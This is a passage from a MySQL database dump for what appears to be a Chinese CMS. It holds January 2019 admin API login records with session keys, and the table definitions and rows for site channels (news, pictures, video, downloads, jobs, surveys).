INSERT INTO `jc_api_user_login` VALUES (446, '2ABB1FF5588ED5D541E65E8B9D26D91E', 'admin', '2019-01-15 10:24:00', 1, '2019-01-15 10:37:04');
INSERT INTO `jc_api_user_login` VALUES (447, 'ED4D9F3CF09B886D25111B5C7DF597F9', 'admin', '2019-01-15 10:37:12', 1, '2019-01-15 10:39:09');
INSERT INTO `jc_api_user_login` VALUES (448, '778E6010950FC14C6F22C984F17602A7', 'admin', '2019-01-15 10:40:43', 1, '2019-01-15 10:43:58');
INSERT INTO `jc_api_user_login` VALUES (449, '391DEF9A43E27FBA04875128C4939C44', 'admin', '2019-01-15 10:44:03', 1, '2019-01-15 10:44:10');
INSERT INTO `jc_api_user_login` VALUES (450, '25A7772646AB542FD9372FBC7D2853AF', 'admin', '2019-01-15 10:44:35', 1, '2019-01-15 10:44:42');
INSERT INTO `jc_api_user_login` VALUES (451, 'BC20BD8FBA02A45454D75AC70289715C', 'admin', '2019-01-15 10:52:11', 1, '2019-01-15 10:52:26');
INSERT INTO `jc_api_user_login` VALUES (452, '1C3DA6E5A5D749444648C70CEB2149C3', 'admin', '2019-01-15 10:57:13', 1, '2019-01-15 10:57:14');
INSERT INTO `jc_api_user_login` VALUES (453, '65C272BEA7546F2863C03FA1846911AA', 'admin', '2019-01-15 10:59:04', 1, '2019-01-15 10:59:06');
INSERT INTO `jc_api_user_login` VALUES (454, 'FA97E63CF91D2F98876C52FB967AFC86', 'admin', '2019-01-15 11:01:10', 1, '2019-01-15 11:01:11');
INSERT INTO `jc_api_user_login` VALUES (455, '3F963E5B07369506667ED0856D87B110', 'admin', '2019-01-15 11:03:17', 1, '2019-01-15 11:03:33');
INSERT INTO `jc_api_user_login` VALUES (456, '21D5CE8BFB77161C98A391B0D178AB10', 'admin', '2019-01-15 11:06:00', 1, '2019-01-15 11:06:01');
INSERT INTO `jc_api_user_login` VALUES (457, '77137AC0D09C47C2F884335DE3DCB445', 'admin', '2019-01-15 11:08:05', 1, '2019-01-15 11:08:29');
INSERT INTO `jc_api_user_login` VALUES (458, 'A83EA4BC8E39C27319F878432574A843', 'admin', '2019-01-15 11:10:00', 1, '2019-01-15 11:10:00');
INSERT INTO `jc_api_user_login` VALUES (459, '68059115CECBE1401530D44E61FD228A', 'admin', '2019-01-15 11:11:51', 1, '2019-01-15 11:11:52');
INSERT INTO `jc_api_user_login` VALUES (460, '363FC1DAB7ED87B72DBAA89B98D9921A', 'admin', '2019-01-15 11:12:11', 1, '2019-01-15 11:12:11');
INSERT INTO `jc_api_user_login` VALUES (461, 'D4C93C0F442A83DF51DB0B217A54FE88', 'admin', '2019-01-15 11:12:57', 1, '2019-01-15 11:13:11');
INSERT INTO `jc_api_user_login` VALUES (462, 'A0BF7C68C348A227345564B808C56EBB', 'admin', '2019-01-15 11:14:29', 1, '2019-01-15 11:14:29');
INSERT INTO `jc_api_user_login` VALUES (463, 'F41E96D8C6D67FA5C47527236764832C', 'admin', '2019-01-15 11:15:49', 1, '2019-01-15 11:36:48');
INSERT INTO `jc_api_user_login` VALUES (464, 'C3DA8E57989DA44002D2BD976A4A68A4', 'admin', '2019-01-15 13:59:19', 1, '2019-01-15 14:02:01');
INSERT INTO `jc_api_user_login` VALUES (465, '08DAF2244059304C107B1C5C2AECEDC9', 'admin', '2019-01-15 14:02:58', 1, '2019-01-15 14:02:58');
INSERT INTO `jc_api_user_login` VALUES (466, '562EBE9053BC25B53722CE7E931EFA26', 'admin', '2019-01-15 14:03:09', 1, '2019-01-15 14:03:20');
INSERT INTO `jc_api_user_login` VALUES (467, '58DDF241A115DAADF791977861CDD5CF', 'admin', '2019-01-15 14:29:07', 1, '2019-01-15 14:51:36');
INSERT INTO `jc_api_user_login` VALUES (468, '4509B87260974E51456DFF58D531D03B', 'admin', '2019-01-15 14:52:42', 1, '2019-01-15 14:52:52');
INSERT INTO `jc_api_user_login` VALUES (469, '22EB74667C09CDF3F78CD34B32C737E4', 'admin', '2019-01-15 14:54:07', 1, '2019-01-15 15:01:02');
INSERT INTO `jc_api_user_login` VALUES (470, '1CD0B8FED2580A9FEA6EB12A953F7A01', 'admin', '2019-01-15 15:01:34', 1, '2019-01-15 15:25:48');
INSERT INTO `jc_api_user_login` VALUES (471, 'CE97DACFD4C2F67D3F9C8A973B6785DD', 'admin', '2019-01-15 15:27:39', 1, '2019-01-15 15:27:40');
INSERT INTO `jc_api_user_login` VALUES (472, '903F1DCC706FF08E9A715A1F5BF57A84', 'admin', '2019-01-15 15:29:32', 1, '2019-01-15 15:29:32');
INSERT INTO `jc_api_user_login` VALUES (473, 'E69ED982670C2F7442C150F824FB187A', 'admin', '2019-01-15 15:29:59', 1, '2019-01-15 15:30:25');
INSERT INTO `jc_api_user_login` VALUES (474, 'D073EA51FD135DA833FB505FF8ECF28D', 'admin', '2019-01-15 15:30:31', 1, '2019-01-15 15:35:53');
INSERT INTO `jc_api_user_login` VALUES (475, 'E8E2D50FB5334ABD526904FD8EAB4CE0', 'admin', '2019-01-15 15:36:53', 1, '2019-01-15 15:38:28');
INSERT INTO `jc_api_user_login` VALUES (476, 'C134B4EF20824B0A5C7DDBBC86F4CAF9', 'admin', '2019-01-15 15:40:29', 1, '2019-01-15 15:48:26');
INSERT INTO `jc_api_user_login` VALUES (477, 'D8482740DCA6F45A8662A5DF6A2BB0AE', 'admin', '2019-01-15 15:49:18', 1, '2019-01-15 15:56:53');
INSERT INTO `jc_api_user_login` VALUES (478, 'C148CDDB0BCBF6D04715A016488FAD1F', 'admin', '2019-01-15 16:06:03', 1, '2019-01-15 16:15:53');
INSERT INTO `jc_api_user_login` VALUES (479, '3CDCBFCC43D9918A94519E5D0A9BE403', 'admin', '2019-01-15 16:20:52', 1, '2019-01-15 16:24:05');
INSERT INTO `jc_api_user_login` VALUES (480, 'A29778DD57FA8D13E1397B6E573A20F3', 'admin', '2019-01-15 16:28:11', 1, '2019-01-15 16:29:40');
INSERT INTO `jc_api_user_login` VALUES (481, '965339888A2674D2597619F73CFC41EF', 'admin', '2019-01-15 16:29:46', 1, '2019-01-15 16:32:00');
INSERT INTO `jc_api_user_login` VALUES (482, 'A5C80D63F445BDD6D51908F1D857DCD7', 'admin', '2019-01-15 16:32:10', 1, '2019-01-15 16:38:28');
INSERT INTO `jc_api_user_login` VALUES (483, '7C18BC517BC90A4867A837067514831D', 'admin', '2019-01-15 16:39:38', 1, '2019-01-15 17:02:27');
INSERT INTO `jc_api_user_login` VALUES (484, '0A6EACC46692B368D6AC18FAA548373F', 'admin', '2019-01-15 17:11:01', 1, '2019-01-15 17:11:29');
INSERT INTO `jc_api_user_login` VALUES (485, 'FB8A83360B71F0B6FD0F917E2EA758DA', 'admin', '2019-01-15 17:13:32', 1, '2019-01-15 17:13:49');
INSERT INTO `jc_api_user_login` VALUES (486, '63AA4ABE0F6C1B0F13303DEE5D83307D', 'admin', '2019-01-15 17:13:55', 1, '2019-01-15 17:25:04');
INSERT INTO `jc_api_user_login` VALUES (487, '0187564102B3FD49E2614BA97FC1ABC7', 'admin', '2019-01-15 17:25:11', 1, '2019-01-15 17:28:57');
INSERT INTO `jc_api_user_login` VALUES (488, '5D857768E6559EFA97EE6241AA294075', 'admin', '2019-01-15 17:29:49', 1, '2019-01-15 17:45:16');
INSERT INTO `jc_api_user_login` VALUES (489, 'AEBC2082B7106528F26E26DD5B0E9BF4', 'admin', '2019-01-16 10:07:18', 1, '2019-01-16 10:07:40');
INSERT INTO `jc_api_user_login` VALUES (490, 'A171B756D24CFDD03E94CA52384CFF95', 'admin', '2019-01-16 10:30:51', 1, '2019-01-16 10:31:53');
INSERT INTO `jc_api_user_login` VALUES (491, 'B930E37BE7B4366F154683438BFCBB10', 'admin', '2019-01-16 11:04:55', 1, '2019-01-16 11:15:24');
INSERT INTO `jc_api_user_login` VALUES (492, '8A5F10B597F5543E7DABEB1E88E5DE7A', 'admin', '2019-01-16 11:15:45', 1, '2019-01-16 11:15:49');
INSERT INTO `jc_api_user_login` VALUES (493, 'C53D245EEFE582C2836A81F447A97C7A', 'admin', '2019-01-16 11:16:48', 1, '2019-01-16 11:25:32');
INSERT INTO `jc_api_user_login` VALUES (494, 'E0C58F57F7CD1EDA2978AA4B50EF96EB', 'admin', '2019-01-16 11:25:37', 1, '2019-01-16 11:33:20');
INSERT INTO `jc_api_user_login` VALUES (495, '382421D7B91707411BFC355DE3D1B788', 'admin', '2019-01-16 13:39:18', 1, '2019-01-16 13:40:30');
INSERT INTO `jc_api_user_login` VALUES (496, 'D1361045C6FF68D64C835AF14C7F351E', 'admin', '2019-01-16 13:40:53', 1, '2019-01-16 13:50:09');
INSERT INTO `jc_api_user_login` VALUES (497, '017E8B656ABB82F2F40C8BEF93DF5DFA', 'admin', '2019-01-16 13:56:33', 1, '2019-01-16 14:04:14');
INSERT INTO `jc_api_user_login` VALUES (498, '8083514DD1DD99180519178F5E209EB3', 'admin', '2019-01-16 14:08:58', 1, '2019-01-16 14:09:03');
INSERT INTO `jc_api_user_login` VALUES (499, '3A68CBFC7ABE66B83A4DD12D7F963068', 'admin', '2019-01-16 14:13:29', 1, '2019-01-16 14:24:49');
INSERT INTO `jc_api_user_login` VALUES (500, 'A8B69A53B2DE721998DE57A125782CE6', 'admin', '2019-01-16 14:26:54', 1, '2019-01-16 14:26:59');
INSERT INTO `jc_api_user_login` VALUES (501, 'E49512DFA27D6DC7345F9F10DB02711E', 'admin', '2019-01-16 14:27:27', 1, '2019-01-16 15:08:56');
INSERT INTO `jc_api_user_login` VALUES (502, '508940A7C7E409FA602DF14D0495AA94', 'admin', '2019-01-16 15:14:38', 1, '2019-01-16 15:16:58');
INSERT INTO `jc_api_user_login` VALUES (503, '16EFE7661AEFEF712FA75F99171048A3', 'admin', '2019-01-16 15:17:08', 1, '2019-01-16 15:34:28');
INSERT INTO `jc_api_user_login` VALUES (504, '2A6490D0A12728BF0D1F6733F3198093', 'admin', '2019-01-16 15:35:58', 1, '2019-01-16 15:43:41');
INSERT INTO `jc_api_user_login` VALUES (505, '944FC5A53B10AC0332E53BCF3A67197A', 'admin', '2019-01-16 15:43:52', 1, '2019-01-16 15:45:44');
INSERT INTO `jc_api_user_login` VALUES (506, '53D099DE325EE8FD357BA1B5E72ACB12', 'admin', '2019-01-16 15:51:48', 1, '2019-01-16 16:05:41');
INSERT INTO `jc_api_user_login` VALUES (507, '15734BC579E1A4DA46D6C9C23941C339', 'admin', '2019-01-16 16:08:44', 1, '2019-01-16 16:31:29');
INSERT INTO `jc_api_user_login` VALUES (508, 'A5C0BB687A0C5C5F2F7D7DFF1540753B', 'admin', '2019-01-16 17:08:34', 1, '2019-01-16 17:36:35');
INSERT INTO `jc_api_user_login` VALUES (509, '3F24EDF0A4EB8123B3F82430C49DBE19', 'admin', '2019-01-17 09:15:19', 1, '2019-01-17 09:18:58');
INSERT INTO `jc_api_user_login` VALUES (510, '168A5071FE8CBCBF415C6F6CB54E19FF', 'admin', '2019-01-17 09:19:21', 1, '2019-01-17 09:22:53');
INSERT INTO `jc_api_user_login` VALUES (511, 'B3FD988980EB04865F8B0FC979B253D4', 'admin', '2019-01-17 09:23:11', 1, '2019-01-17 09:23:12');
INSERT INTO `jc_api_user_login` VALUES (512, 'EBEC01A292C823BA13CB652D8DC53031', 'admin', '2019-01-17 09:24:12', 1, '2019-01-17 09:24:14');
INSERT INTO `jc_api_user_login` VALUES (513, 'ED2472A2A3784FA027A73676DCAE09EA', 'admin', '2019-01-17 10:04:32', 1, '2019-01-17 10:07:55');
INSERT INTO `jc_api_user_login` VALUES (514, 'E738ED8F0096A36914C7E439B0DC433D', 'admin', '2019-01-17 10:08:19', 1, '2019-01-17 10:58:36');
INSERT INTO `jc_api_user_login` VALUES (515, '1EAE9E429904B971CB5794AA5D052C89', 'admin', '2019-01-17 11:26:52', 1, '2019-01-17 11:50:34');
INSERT INTO `jc_api_user_login` VALUES (516, '0F8299EB463B7387FB5BBB4E0CCF4278', 'admin', '2019-01-17 12:36:29', 1, '2019-01-17 12:41:48');
INSERT INTO `jc_api_user_login` VALUES (517, '8B87FD078EE19672D63B6ADB60D8CE74', 'admin', '2019-01-17 13:46:01', 1, '2019-01-17 16:06:14');
INSERT INTO `jc_api_user_login` VALUES (518, 'D9168059ACB1E5B8EE6CCE727E6D2F68', 'admin', '2019-01-17 16:56:18', 1, '2019-01-17 17:35:20');
INSERT INTO `jc_api_user_login` VALUES (519, '8B33D6885FCCB9ED928B2E5C88451191', 'admin', '2019-01-18 09:22:23', 1, '2019-01-18 09:43:02');
INSERT INTO `jc_api_user_login` VALUES (520, '24EF129F9B088E55B1776349D8642C5B', 'admin', '2019-01-18 09:43:09', 1, '2019-01-18 09:58:38');
INSERT INTO `jc_api_user_login` VALUES (521, 'F3A6CD81DFFECB3044B343C1BE8480B3', 'admin', '2019-01-18 13:54:24', 1, '2019-01-18 14:06:10');
INSERT INTO `jc_api_user_login` VALUES (522, 'F5D41861E5E0FB8EE59B47B5A8BE4FED', 'admin', '2019-01-18 14:06:24', 1, '2019-01-18 14:20:17');
INSERT INTO `jc_api_user_login` VALUES (523, '8DB7513F815B7B609F9AA70A6BB185D6', 'admin', '2019-01-18 14:20:58', 1, '2019-01-18 14:37:39');
INSERT INTO `jc_api_user_login` VALUES (524, 'D756477811C0DD364EB734F5B66FD12C', 'admin', '2019-01-18 14:37:44', 1, '2019-01-18 14:42:09');
INSERT INTO `jc_api_user_login` VALUES (525, 'AC94F70180040758E6C1B134243A3DE5', 'admin', '2019-01-18 14:42:23', 1, '2019-01-18 16:21:50');
INSERT INTO `jc_api_user_login` VALUES (526, 'F2EBD4532217B254214AE6090C8DCBA5', 'admin', '2019-01-18 16:31:16', 1, '2019-01-18 16:34:39');
INSERT INTO `jc_api_user_login` VALUES (527, '82C95E9F73ED474A8E7FBD6815BAE7E8', 'admin', '2019-01-18 16:55:54', 1, '2019-01-18 17:09:38');
INSERT INTO `jc_api_user_login` VALUES (528, 'D9F7692FBE74268DC9FBE904A374F908', 'admin', '2019-01-21 09:59:51', 1, '2019-01-21 11:13:29');
INSERT INTO `jc_api_user_login` VALUES (529, 'FA75485CE4AEF4860563DAD411E4572B', 'admin', '2019-01-21 14:38:40', 1, '2019-01-21 15:10:44');
INSERT INTO `jc_api_user_login` VALUES (530, 'BCB769F7C26DAB19A32B0CEDEEA6390C', 'admin', '2019-01-21 15:11:02', 1, '2019-01-21 15:26:38');
INSERT INTO `jc_api_user_login` VALUES (531, '078D9E4846DB4427D5E884F536F1340A', 'admin', '2019-01-21 15:49:24', 1, '2019-01-21 16:05:04');
INSERT INTO `jc_api_user_login` VALUES (532, '08D9FD5429F2B7734C55E3D98BE14C8F', 'admin', '2019-01-21 16:57:02', 1, '2019-01-21 17:22:19');
INSERT INTO `jc_api_user_login` VALUES (533, 'D94E71F95474FDA54A0B45C8E1EE9FB2', 'admin', '2019-01-22 10:56:16', 1, '2019-01-22 10:56:16');
INSERT INTO `jc_api_user_login` VALUES (534, 'D4E0C0A26139488C675D7699E1C3E220', 'admin', '2019-01-22 13:45:40', 1, '2019-01-22 13:45:40');
INSERT INTO `jc_api_user_login` VALUES (535, 'EB611E7EC50307A7B9A34BA0A90491FF', 'admin', '2019-01-22 13:46:12', 1, '2019-01-22 13:46:23');
INSERT INTO `jc_api_user_login` VALUES (536, '0D78B5E5D372B2A7848AC0DF8B7E8513', 'admin', '2019-01-22 14:59:32', 1, '2019-01-22 15:01:05');
INSERT INTO `jc_api_user_login` VALUES (537, 'AB03220A9C9A66E558D9AB248482D754', 'admin', '2019-01-22 15:23:00', 1, '2019-01-22 15:27:42');
INSERT INTO `jc_api_user_login` VALUES (538, 'E50AAD1D9B5F23885BDD3998BC6E7650', 'admin', '2019-01-22 15:27:49', 1, '2019-01-22 15:35:17');
INSERT INTO `jc_api_user_login` VALUES (539, '11E4CACC8EF8BDC098DF973C122EBD8F', 'admin', '2019-01-23 10:19:43', 1, '2019-01-23 10:24:05');
INSERT INTO `jc_api_user_login` VALUES (540, 'DA7BCBCE71FD505C601771896CD839AF', 'admin', '2019-01-23 10:46:23', 1, '2019-01-23 10:54:04');
INSERT INTO `jc_api_user_login` VALUES (541, 'B861167AD8BBE69361310CCFCE53B659', 'admin', '2019-01-23 13:47:16', 1, '2019-01-23 14:44:35');
INSERT INTO `jc_api_user_login` VALUES (542, 'EF5D00929C5041785325435A2F886276', 'admin', '2019-01-23 14:46:34', 1, '2019-01-23 15:19:48');
INSERT INTO `jc_api_user_login` VALUES (543, '11132C844BF3C528D3A7AC950E9BA499', 'admin', '2019-01-25 14:37:04', 1, '2019-01-25 15:21:10');
INSERT INTO `jc_api_user_login` VALUES (544, '06A073A175FE89953F2393B5F7995917', 'admin', '2019-01-25 15:30:45', 1, '2019-01-25 15:30:54');
INSERT INTO `jc_api_user_login` VALUES (545, 'B31903990C76EA36B8B34DD190D5E4FD', 'admin', '2019-01-25 15:36:43', 1, '2019-01-25 15:38:54');
INSERT INTO `jc_api_user_login` VALUES (546, '57682C352F465A06AAEC91055ADCF83D', 'admin', '2019-01-25 15:40:24', 1, '2019-01-25 15:45:33');
INSERT INTO `jc_api_user_login` VALUES (547, '5C8788E6DF3FDB3A78A2BA56649E5982', 'admin', '2019-01-25 15:45:38', 1, '2019-01-25 15:45:51');
INSERT INTO `jc_api_user_login` VALUES (548, '25EE58B474900F2ECD2E6803E8478900', 'admin', '2019-01-25 15:48:18', 1, '2019-01-25 15:48:26');
INSERT INTO `jc_api_user_login` VALUES (549, '2156CBE503F2B5574EBEE96075EEE89B', 'admin', '2019-01-25 15:49:55', 1, '2019-01-25 15:50:52');
INSERT INTO `jc_api_user_login` VALUES (550, '2035EDEB07D12119A0E0C5F61B37A910', 'admin', '2019-01-25 15:50:58', 1, '2019-01-25 16:02:27');
INSERT INTO `jc_api_user_login` VALUES (551, '5AE56D4390011EB42EB51EE34560DBE5', 'admin', '2019-01-25 16:02:34', 1, '2019-01-25 16:03:01');
INSERT INTO `jc_api_user_login` VALUES (552, '68B8F67A9F9CF2B8F0E610E2FDFCD4B2', 'admin', '2019-01-25 16:03:57', 1, '2019-01-25 16:09:38');
INSERT INTO `jc_api_user_login` VALUES (553, '19D2FE060612D25D661AEC1CFCBCF138', 'admin', '2019-01-25 16:11:05', 1, '2019-01-25 16:11:06');
INSERT INTO `jc_api_user_login` VALUES (554, '446562BADE8F96B5E38243AD613AA771', 'admin', '2019-01-25 16:12:59', 1, '2019-01-25 16:13:14');
INSERT INTO `jc_api_user_login` VALUES (555, '351AF5C0858BFD20161B00E570598184', 'admin', '2019-01-25 17:14:46', 1, '2019-01-25 17:19:34');
INSERT INTO `jc_api_user_login` VALUES (556, '30D579A5EF5AB20018767354CD6A8056', 'admin', '2019-01-25 17:22:52', 1, '2019-01-25 17:31:32');
INSERT INTO `jc_api_user_login` VALUES (557, 'AFA490084E76B284A6B22C63890B6DA9', 'admin', '2019-01-28 09:54:23', 1, '2019-01-28 10:23:31');
INSERT INTO `jc_api_user_login` VALUES (558, '4D8EA6E63E9BCDF0CB75C99D07B9A954', 'admin', '2019-01-28 14:36:50', 1, '2019-01-28 14:49:27');
INSERT INTO `jc_api_user_login` VALUES (559, '69EBB30335B7415E34500D571271DF20', 'admin', '2019-01-28 16:28:58', 1, '2019-01-28 16:33:33');
INSERT INTO `jc_api_user_login` VALUES (560, '1B082B9BC2D8029F0A74EC6CE13ED23F', 'admin', '2019-01-28 16:39:56', 1, '2019-01-28 16:59:39');
INSERT INTO `jc_api_user_login` VALUES (561, 'E41796EB43E20D9F79C7E7ACA6F73EBB', 'admin', '2019-01-29 10:16:34', 1, '2019-01-29 10:17:19');

-- ----------------------------
-- Table structure for jc_channel
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel`;
CREATE TABLE `jc_channel`  (
  `channel_id` int(11) NOT NULL AUTO_INCREMENT,
  `model_id` int(11) NOT NULL COMMENT '模型ID',
  `site_id` int(11) NOT NULL COMMENT '站点ID',
  `parent_id` int(11) NULL DEFAULT NULL COMMENT '父栏目ID',
  `channel_path` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '访问路径',
  `lft` int(11) NOT NULL DEFAULT 1 COMMENT '树左边',
  `rgt` int(11) NOT NULL DEFAULT 2 COMMENT '树右边',
  `priority` int(11) NOT NULL DEFAULT 10 COMMENT '排列顺序',
  `has_content` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否有内容',
  `is_display` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否显示',
  PRIMARY KEY (`channel_id`) USING BTREE,
  INDEX `fk_jc_channel_model`(`model_id`) USING BTREE,
  INDEX `fk_jc_channel_parent`(`parent_id`) USING BTREE,
  INDEX `fk_jc_channel_site`(`site_id`) USING BTREE,
  INDEX `index_jc_channel_lft`(`lft`) USING BTREE,
  INDEX `index_jc_channel_rgt`(`rgt`) USING BTREE,
  CONSTRAINT `fk_jc_channel_model` FOREIGN KEY (`model_id`) REFERENCES `jc_model` (`model_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_channel_parent` FOREIGN KEY (`parent_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT,
  CONSTRAINT `fk_jc_channel_site` FOREIGN KEY (`site_id`) REFERENCES `jc_site` (`site_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB AUTO_INCREMENT = 95 CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS栏目表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_channel
-- ----------------------------
INSERT INTO `jc_channel` VALUES (75, 1, 1, NULL, 'news', 1, 2, 10, 1, 1);
INSERT INTO `jc_channel` VALUES (76, 5, 1, NULL, 'pic', 3, 4, 10, 1, 1);
INSERT INTO `jc_channel` VALUES (77, 6, 1, NULL, 'video', 5, 6, 10, 1, 1);
INSERT INTO `jc_channel` VALUES (78, 4, 1, NULL, 'download', 7, 16, 10, 1, 1);
INSERT INTO `jc_channel` VALUES (79, 8, 1, NULL, 'job', 17, 18, 10, 1, 1);
INSERT INTO `jc_channel` VALUES (80, 2, 1, NULL, 'survey', 19, 20, 11, 0, 1);
INSERT INTO `jc_channel` VALUES (82, 2, 1, NULL, 'message', 21, 22, 10, 0, 1);
INSERT INTO `jc_channel` VALUES (90, 4, 1, 78, 'xtrj', 8, 9, 10, 1, 1);
INSERT INTO `jc_channel` VALUES (91, 4, 1, 78, 'mtzs', 10, 11, 10, 1, 1);
INSERT INTO `jc_channel` VALUES (92, 4, 1, 78, 'jptj', 12, 13, 9, 1, 1);
INSERT INTO `jc_channel` VALUES (93, 4, 1, 78, 'yxyl', 14, 15, 10, 1, 1);
INSERT INTO `jc_channel` VALUES (94, 9, 1, NULL, 'mszl', 23, 24, 10, 1, 1);

-- ----------------------------
-- Table structure for jc_channel_attr
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_attr`;
CREATE TABLE `jc_channel_attr`  (
  `channel_id` int(11) NOT NULL,
  `attr_name` varchar(30) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `attr_value` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '值',
  INDEX `fk_jc_attr_channel`(`channel_id`) USING BTREE,
  CONSTRAINT `fk_jc_attr_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS栏目扩展属性表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_channel_attr
-- ----------------------------
INSERT INTO `jc_channel_attr` VALUES (94, 'interviewDescribe', '面试专栏描述');

-- ----------------------------
-- Table structure for jc_channel_count
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_count`;
CREATE TABLE `jc_channel_count`  (
  `channel_id` int(11) NOT NULL,
  `views` int(11) NOT NULL DEFAULT 0 COMMENT '总访问数',
  `views_month` int(11) NOT NULL DEFAULT 0 COMMENT '月访问数',
  `views_week` int(11) NOT NULL DEFAULT 0 COMMENT '周访问数',
  `views_day` int(11) NOT NULL DEFAULT 0 COMMENT '日访问数',
  `content_count_total` int(11) NOT NULL DEFAULT 0 COMMENT '内容发布数',
  `content_count_day` int(11) NOT NULL DEFAULT 0 COMMENT '内容今日发布数',
  `content_count_week` int(11) NOT NULL DEFAULT 0 COMMENT '内容本周发布数',
  `content_count_month` int(11) NOT NULL DEFAULT 0 COMMENT '内容本月发布数',
  `content_count_year` int(11) NOT NULL DEFAULT 0 COMMENT '内容今年发布数',
  PRIMARY KEY (`channel_id`) USING BTREE,
  CONSTRAINT `fk_jc_count_channel` FOREIGN KEY (`channel_id`) REFERENCES `jc_channel` (`channel_id`) ON DELETE RESTRICT ON UPDATE RESTRICT
) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = 'CMS栏目访问量计数表' ROW_FORMAT = Compact;

-- ----------------------------
-- Records of jc_channel_count
-- ----------------------------
INSERT INTO `jc_channel_count` VALUES (75, 480, 27, 27, 27, 8, 2, 2, 3, 3);
INSERT INTO `jc_channel_count` VALUES (76, 233, 27, 27, 27, 3, 0, 0, 3, 3);
INSERT INTO `jc_channel_count` VALUES (77, 47, 2, 2, 2, 1, 1, 1, 1, 1);
INSERT INTO `jc_channel_count` VALUES (78, 27, 0, 0, 0, 3, 3, 3, 3, 3);
INSERT INTO `jc_channel_count` VALUES (79, 50, 1, 1, 1, 1, 0, 0, 0, 0);
INSERT INTO `jc_channel_count` VALUES (80, 33, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_channel_count` VALUES (82, 6, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_channel_count` VALUES (90, 12, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_channel_count` VALUES (91, 2, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_channel_count` VALUES (92, 12, 0, 0, 0, 3, 3, 3, 3, 3);
INSERT INTO `jc_channel_count` VALUES (93, 2, 0, 0, 0, 0, 0, 0, 0, 0);
INSERT INTO `jc_channel_count` VALUES (94, 1, 1, 1, 1, 1, 0, 0, 1, 1);

-- ----------------------------
-- Table structure for jc_channel_ext
-- ----------------------------
DROP TABLE IF EXISTS `jc_channel_ext`;
CREATE TABLE `jc_channel_ext`  (
  `channel_id` int(11) NOT NULL,
  `channel_name` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL COMMENT '名称',
  `final_step` tinyint(4) NULL DEFAULT 2 COMMENT '终审级别',
  `after_check` tinyint(4) NULL DEFAULT NULL COMMENT '审核后(1:不能修改删除;2:修改后退回;3:修改后不变)',
  `is_static_channel` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '是否栏目静态化',
  `is_static_content` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '是否内容静态化',
  `is_access_by_dir` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '1' COMMENT '是否使用目录访问',
  `is_list_child` char(1) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL DEFAULT '0' COMMENT '是否使用子栏目列表',
  `page_size` int(11) NOT NULL DEFAULT 20 COMMENT '每页多少条记录',
  `channel_rule` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '栏目页生成规则',
  `content_rule` varchar(150) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容页生成规则',
  `link` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '外部链接',
  `tpl_channel` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '栏目页模板',
  `tpl_content` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容页模板',
  `title_img` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '缩略图',
  `content_img` varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT '内容图',
  `has_title_img` tinyint(1) NOT NULL DEFAULT 0 COMMENT '内容是否有缩略图',
  `has_content_img` tinyint(1) NOT NULL DEFAULT 0 COMMENT '内容是否有内容图',
  `title_img_width` int(11) NOT NULL DEFAULT 139 COMMENT '内容标题图宽度',
  `title_img_height` int(11) NOT NULL DEFAULT 139 COMMENT '内容标题图高度',
  `content_img_width` int(11) NOT NULL DEFAULT 310 COMMENT '内容内容图宽度',
  `content_img_height` int(11) NOT NULL DEFAULT 310 COMMENT '内容内容图高度',
  `comment_control` int(11) NOT NULL DEFAULT 0 COMMENT '评论(0:匿名;1:会员一次;2:关闭,3会员多次)',
  `allow_updown` tinyint(1) NOT NULL DEFAULT 1 COMMENT '顶踩(true:开放;false:关闭)',
  `is_blank` tinyint(1) NOT NULL DEFAULT 1 COMMENT '是否新窗口打开',
  `title` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'TITLE',
  `keywords` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'KEYWORDS',
  `description` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT 'DESCRIPTION',
  `allow_share` tinyint(1) NOT NULL DEFAULT 0 COMMENT '分享(true:开放;false:关闭)',
